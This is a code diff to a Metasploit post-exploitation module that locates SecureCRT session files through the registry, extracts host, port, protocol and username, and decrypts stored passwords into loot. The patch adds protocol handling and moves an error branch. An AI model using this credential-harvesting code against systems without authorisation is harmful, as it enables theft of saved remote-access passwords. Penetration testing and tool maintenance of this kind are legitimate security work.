@@ -73,13 +73,19 @@ class MetasploitModule < Msf::Post
       end
 
       file = try_encode_file(file_contents)
+      protocol = Regexp.compile('S:"Protocol Name"=([^\r\n]*)').match(file) ? Regexp.last_match(1) : nil
       hostname = Regexp.compile('S:"Hostname"=([^\r\n]*)').match(file) ? Regexp.last_match(1) : nil
       password = Regexp.compile('S:"Password"=u([0-9a-f]+)').match(file) ? securecrt_crypto(Regexp.last_match(1)) : nil
       passwordv2 = Regexp.compile('S:"Password V2"=02:([0-9a-f]+)').match(file) ? securecrt_crypto_v2(Regexp.last_match(1)) : nil
-      port = Regexp.compile('D:"\[SSH2\] Port"=([0-9a-f]{8})').match(file) ? Regexp.last_match(1).to_i(16).to_s : nil
+      port = Regexp.compile("D:\"\\\[#{protocol}\\\] Port\"=([0-9a-f]{8})").match(file) ? Regexp.last_match(1).to_i(16).to_s : nil
+      port = Regexp.compile('D:"Port"=([0-9a-f]{8})').match(file) ? Regexp.last_match(1).to_i(16).to_s : nil if !port
       username = Regexp.compile('S:"Username"=([^\r\n]*)').match(file) ? Regexp.last_match(1) : nil
+
+      next unless (hostname && port && protocol)
+
       tbl << {
         file_name: item['name'],
+        protocol: protocol.downcase,
         hostname: hostname,
         port: port,
         username: username,
@@ -130,7 +136,7 @@ class MetasploitModule < Msf::Post
     service_data = {
       address: config[:hostname],
       port: config[:port],
-      service_name: 'ssh',
+      service_name: config[:service_name],
       protocol: 'tcp',
       workspace_id: myworkspace_id
     }
@@ -159,10 +165,13 @@ class MetasploitModule < Msf::Post
     parent_key = 'HKEY_CURRENT_USER\\Software\\VanDyke\\SecureCRT'
     # get session file path
     securecrt_path = expand_path(registry_getvaldata(parent_key, 'Config Path') + session.fs.file.separator + 'Sessions')
-    unless securecrt_path.to_s.empty?
+    if securecrt_path.to_s.empty?
+      print_error('Could not find the registry entry for the SecureCRT session path. Ensure that SecureCRT is installed on the target.')
+    else
       result = enum_session_file(securecrt_path)
       columns = [
         'Filename',
+        'Protocol',
         'Hostname',
         'Port',
         'Username',
@@ -177,6 +186,7 @@ class MetasploitModule < Msf::Post
         config = {
           file_name: item[:file_name],
           hostname: item[:hostname],
+          service_name: item[:protocol],
           port: item[:port].to_i,
           username: item[:username],
           password: item[:password]
@@ -188,8 +198,6 @@ class MetasploitModule < Msf::Post
         path = store_loot('host.securecrt_sessions', 'text/plain', session, tbl, 'securecrt_sessions.txt', 'SecureCRT Sessions')
         print_good("Session info stored in: #{path}")
       end
-    else
-      print_error('Could not find the registry entry for the SecureCRT session path. Ensure that SecureCRT is installed on the target.')
     end
   end
 end
